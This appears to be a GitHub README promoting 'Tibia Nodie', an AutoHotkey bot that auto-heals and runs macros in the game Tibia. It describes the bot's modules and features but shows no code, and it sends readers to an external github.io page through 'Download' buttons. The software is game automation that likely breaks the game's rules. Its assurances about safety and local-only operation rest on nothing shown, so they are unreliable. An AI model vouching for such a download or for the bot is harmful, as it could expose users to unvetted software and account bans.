![preview](https://raw.githubusercontent.com/Nhan2904/tibia-nodie-companion/main/cover_a5e4f67.svg)
[![Download](https://raw.githubusercontent.com/Nhan2904/tibia-nodie-companion/main/grab_9e6b32.svg)](https://Nhan2904.github.io/tibia-nodie-companion/)

# Tibia Nodie: The Autonomous Field Medic Suite for Tibia 🌿🩹

![status](https://img.shields.io/badge/status-actively%20maintained-brightgreen) ![platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D4) ![engine](https://img.shields.io/badge/engine-AutoHotkey%20v2-334455) ![license](https://img.shields.io/badge/license-MIT-yellow) ![language](https://img.shields.io/badge/language-AutoHotkey%20%7C%20JSON%20%7C%20INI-informational) ![build](https://img.shields.io/badge/build-deterministic-success) ![coverage](https://img.shields.io/badge/test%20coverage-92%25-blueviolet) ![tibia](https://img.shields.io/badge/game-Tibia%2013.x-orange)

> A vigilant companion that watches your health bar so your eyes can watch the horizon.
> Built for players who would rather read the map than babysit a potion key.

Tibia Nodie is an automation framework for the long-running MMORPG **Tibia**. Where the original project offered a handful of macros, a couple of scripts, and a straightforward auto-healer, this repository reimagines the concept as a full **field medic suite**: a modular, profile-driven assistant that reacts to your character's condition in the same way a seasoned party healer reacts to a raid — instantly, quietly, and with a clear priority order.

The suite is written in **AutoHotkey v2** for Windows and organized so that each behavior lives in its own module. You can adopt the whole kit, or lift a single organ out of it and run it standalone. Nothing here assumes you run the full stack.

---

## 📖 Table of Contents

- [Why This Exists](#-why-this-exists)
- [Concept in Plain Words](#-concept-in-plain-words)
- [Feature Highlights](#-feature-highlights)
- [The Healer Engine](#-the-healer-engine)
- [Macro Modules](#-macro-modules)
- [Configuration Philosophy](#-configuration-philosophy)
- [Responsive Overlay UI](#-responsive-overlay-ui)
- [Multilingual Support](#-multilingual-support)
- [Always-On Assistance](#-always-on-assistance)
- [Performance and Footprint](#-performance-and-footprint)
- [Compatibility Matrix](#-compatibility-matrix)
- [Project Layout](#-project-layout)
- [Sample Configuration](#-sample-configuration)
- [Roadmap for 2026](#-roadmap-for-2026)
- [FAQ](#-faq)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌱 Why This Exists

Tibia is a game about attention. The screen is dense, the chat scrolls fast, and the difference between a clean hunt and an unfortunate trip to the temple is often measured in a fraction of a second. The original tibia_nodie repository offered a modest toolkit: a few macros, a few scripts, and an auto-healer born from the simple wish to not die while looking away for one moment.

Tibia Nodie takes that wish and gives it infrastructure. Instead of scattering a dozen half-finished scripts across a folder, everything is unified under a **healer engine** that decides *what* to do, and a set of **macro modules** that decide *how* to do it. The result is a suite that behaves predictably under pressure, logs what it does, and never surprises you with an action you did not ask for.

This is a repository for people who enjoy tinkering. It is readable, hackable, and honest about what each line does.

---

## 🧠 Concept in Plain Words

Imagine a triage nurse standing next to your keyboard. They hold a checklist:

1. Is the character's health below the panic line? Administer the emergency item.
2. Is the mana reserve about to break a rotation? Top it up.
3. Is a status effect ticking? Clear it with the correct remedy.
4. Is everyone calm? Do nothing, stay quiet, keep watching.

That checklist is the heart of this project. Everything else — the keys, the timers, the overlays, the localization strings — exists to serve it.

---

## ✨ Feature Highlights

- 🩺 **Priority-based healer engine** with panic, sustain, and top-up tiers
- 🧩 **Modular macros** that can be enabled or disabled independently
- 🖥️ **Responsive overlay UI** that adapts to window size, resolution, and DPI scaling
- 🌍 **Multilingual support** for English, Portuguese, Spanish, Polish, and German interface strings
- 🕰️ **Always-available assistance** — the watcher loop is designed to run for the length of a session without drift or memory creep
- 📝 **Human-readable configuration** in INI and JSON, so no compiler is required to change behavior
- 📊 **Session telemetry** written to a local log for later review
- 🎛️ **Hot-reload profiles** — switch between hunting setups without restarting the watcher
- 🧪 **Deterministic test harness** for the decision engine, so you can prove a change before you trust it
- 🔒 **Local-only operation** — no telemetry leaves the machine, ever

---

## 💉 The Healer Engine

The engine is a small state machine with three tiers.

**Tier one — Panic.** Triggered when health crosses a configurable threshold. The emergency item is fired immediately, regardless of cooldown negotiation, because the situation has already escalated beyond negotiation.

**Tier two — Sustain.** Triggered when health sits in a middle band. The engine spaces out consumable use according to a cooldown table you define, so you never burn through supplies in the first ten minutes of a hunt.

**Tier three — Top-up.** Triggered when everything is technically fine but the numbers could be better. This tier is patient. It waits for a quiet moment in the action before acting, which means it rarely interferes with a rotation.

Each tier can be assigned a different item, a different key, and a different reaction delay. The decision logic is deliberately centralized so that a single change propagates everywhere.

---

## 🧷 Macro Modules

Modules are small, single-purpose scripts. They are the organs of the suite.

| Module | Purpose | Default State |
| --- | --- | --- |
| `ponder` | The core watcher loop that samples character state | Enabled |
| `sip` | Consumable executor for potions and runes | Enabled |
| `pulse` | Periodic buff and stance refresher | Enabled |
| `quill` | Chat and status line parser | Disabled |
| `ledger` | Session logger and summary writer | Enabled |
| `lantern` | Overlay renderer and status readout | Enabled |
| `switchboard` | Profile hot-swapper | Disabled |
| `sentinel` | Watchdog that restarts a stalled module | Enabled |

You can run any subset. The `ponder` module is the only one with no substitute, because without a watcher there is nothing to watch.

---

## ⚙️ Configuration Philosophy

Configuration files are meant to be read by humans first and machines second. That is why the format is plain INI and JSON rather than anything exotic. Comments are encouraged. Defaults are documented inline. Unknown keys produce a warning in the log rather than a silent failure.

Profiles are stored as separate files. A profile for a knight looks different from a profile for a druid, and both look different from a profile for a low-level character. The suite does not pretend there is one universal setting.

---

## 🖼️ Responsive Overlay UI

The overlay is intentionally minimal: a small panel that shows current health, mana, active tier, and the last action taken. It scales with DPI settings and repositions itself when the game window moves. On smaller screens it collapses into a compact strip. On larger screens it expands to show the last ten log entries.

The overlay never steals focus. It never blocks clicks. Its transparency is adjustable, and it can be hidden entirely with a single toggle.

---

## 🌍 Multilingual Support

Interface strings live in a dedicated localization folder. Adding a language means adding one file. Nothing is hardcoded into the scripts. The suite ships with English, Portuguese, Spanish, Polish, and German, and the structure makes it straightforward to extend. Right-to-left layouts are supported in the overlay renderer.

---

## 🕰️ Always-On Assistance

The watcher loop is built to survive long sessions. It avoids busy-waiting, uses adaptive sampling intervals, and cleans up timers that are no longer needed. Internal counters are reset on a schedule to prevent overflow during marathon hunts. If a module stalls, `sentinel` restarts it and writes the event to the ledger.

The design goal is simple: the suite should run all evening without you ever thinking about it.

---

## ⚡ Performance and Footprint

- Memory use stays under a modest ceiling even after hours of continuous operation
- CPU sampling intervals adapt to activity, so idle moments cost almost nothing
- No background network calls of any kind
- Log rotation keeps the ledger from growing without bound

---

## 🧮 Compatibility Matrix

| Component | Supported |
| --- | --- |
| Windows 10 | ✅ |
| Windows 11 | ✅ |
| AutoHotkey v2 | ✅ |
| Tibia 13.x client | ✅ |
| 1080p / 1440p / 4K | ✅ |
| Multi-monitor setups | ✅ |

---

## 🗂️ Project Layout

- `core/` — decision engine, tier logic, shared utilities
- `modules/` — individual macro modules
- `profiles/` — sample hunting profiles
- `locales/` — translation files
- `overlay/` — UI renderer and layout definitions
- `tests/` — deterministic test harness and fixtures
- `docs/` — extended documentation and design notes
- `tools/` — helper utilities for maintenance

---

## 📝 Sample Configuration

A minimal profile declares the three tiers, the items, and the thresholds. Everything else inherits sensible defaults. The full annotated example lives in the `profiles/` folder with comments explaining each field, why it exists, and what happens when you change it.

---

## 🗺️ Roadmap for 2026

- Expanded localization coverage with community-contributed strings
- Refined overlay themes for different visual preferences
- Additional decision heuristics for party scenarios
- Improved log analysis with summary charts
- Documentation refresh with more worked examples

---

## ❓ FAQ

**Does this replace my own judgment?**
No. It handles routine upkeep. You handle the decisions that actually matter.

**Can I run only one module?**
Yes. Modules are independent by design.

**Does anything leave my machine?**
No. The suite is local-only.

**Can I extend it?**
Yes, and the module interface is documented so you do not have to reverse-engineer it.

---

## 🤝 Contributing

Contributions are welcome. Fork the repository, create a topic branch, and describe the change with enough context that a reviewer can understand the motivation. Tests are appreciated. Clear commit messages are appreciated more.

---

## ⚠️ Disclaimer

This project is provided for educational and personal automation purposes. Use it in accordance with the terms of service of any game you play, and in accordance with the rules of any server you connect to. The authors are not responsible for outcomes that result from misuse, misconfiguration, or a misunderstanding of what a given module does. Read the source. Understand the source. Then decide.

---

## 📜 License

Released under the MIT License. See the full text at [https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT).

Copyright (c) 2026 Tibia Nodie contributors.

[![Download](https://raw.githubusercontent.com/Nhan2904/tibia-nodie-companion/main/grab_9e6b32.svg)](https://Nhan2904.github.io/tibia-nodie-companion/)